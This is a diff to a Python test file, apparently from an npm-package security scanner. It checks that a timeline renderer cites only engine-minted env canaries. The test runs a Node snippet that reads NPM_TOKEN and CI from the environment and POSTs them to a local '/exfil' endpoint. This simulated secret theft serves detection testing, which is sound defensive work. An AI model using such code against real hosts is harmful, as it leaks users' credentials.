@@ -20,8 +20,9 @@
 #      off (the hook is installed after every fragment that requires anything)
 #   C5 http.get / https.get are captured — Node's get calls the module-internal
 #      request(), so patching `request` alone left every get invisible at L4
-#   C6 render_timeline names which planted env canaries a captured body carries,
-#      and says nothing when there is no body
+#   C6 render_timeline names which MINTED env canaries a captured body carries,
+#      says nothing when there is no body, and never cites a planted value the
+#      engine did not mint (`CI=true`, exfiltrated in the same request)
 #   C7 the string and URL-instance request forms keep their own authority verbatim
 import json
 import shutil
@@ -33,6 +34,7 @@ from npmguard.contract.models import RunArtifact
 from npmguard.docker import instrumentation_source
 from npmguard.evidence import (
     compute_event_summary,
+    mint_canary,
     parse_l4_trace,
     render_timeline,
     seal_run_artifact,
@@ -253,7 +255,14 @@ def test_planted_env_canary_in_a_body_is_named_in_the_timeline(tmp_path) -> None
     """C6: a canary planted via setEnv and found in a captured request body is named
     on the rendered line, so a judge can cite the correlation. hyp-0004 refuted real
     exfiltration for exactly this gap: "the POST request is recorded but its payload
-    is not specified"."""
+    is not specified". End to end on the real objects: the value is minted by
+    `mint_canary`, read out of `process.env` by real node, captured by the real
+    instrument, and matched by the renderer. `CI` is the control — it is planted and
+    exfiltrated in the same request, and it is not bait, because bait is what the
+    engine MINTED and not whatever the experiment happened to plant."""
+    # A realistic `npm_` shape around the minted token: the renderer matches the token
+    # alone, so a planted value may keep whatever shape the exfil branch requires.
+    planted = {"NPM_TOKEN": f"npm_{mint_canary()}", "CI": "true"}
     events = _run(
         tmp_path,
         f"""
@@ -263,13 +272,13 @@ def test_planted_env_canary_in_a_body_is_named_in_the_timeline(tmp_path) -> None
         req.on('error', () => {{}});
         req.end(JSON.stringify({{ npm: process.env.NPM_TOKEN, ci: process.env.CI }}));
         """,
-        env={"NPM_TOKEN": "npm_12345secrettoken", "CI": "true"},
+        env=planted,
     )
     artifact = seal_run_artifact(
         {
             "runId": "run-l4",
             "triggerUsed": {"kind": "entrypoint", "target": "target.js"},
-            "setupApplied": {"env": {"NPM_TOKEN": "npm_12345secrettoken", "CI": "true"}},
+            "setupApplied": {"env": planted},
             "observe": {
                 "kernel": False,
                 "network": False,
@@ -292,6 +301,6 @@ def test_planted_env_canary_in_a_body_is_named_in_the_timeline(tmp_path) -> None
     line = next(row for row in text.splitlines() if " net " in row)
     assert f"POST http://127.0.0.1:{DEAD_PORT}/exfil" in line
     assert "carries planted env NPM_TOKEN" in line
-    # "true" is too short to be a canary — matching it would hand the judge a
-    # citation that proves nothing.
+    # CI was planted and exfiltrated in the same body, and is still not cited: it is
+    # not a minted canary, so an ordinary value can never manufacture a citation.
     assert "CI" not in line.split("carries planted env")[1]
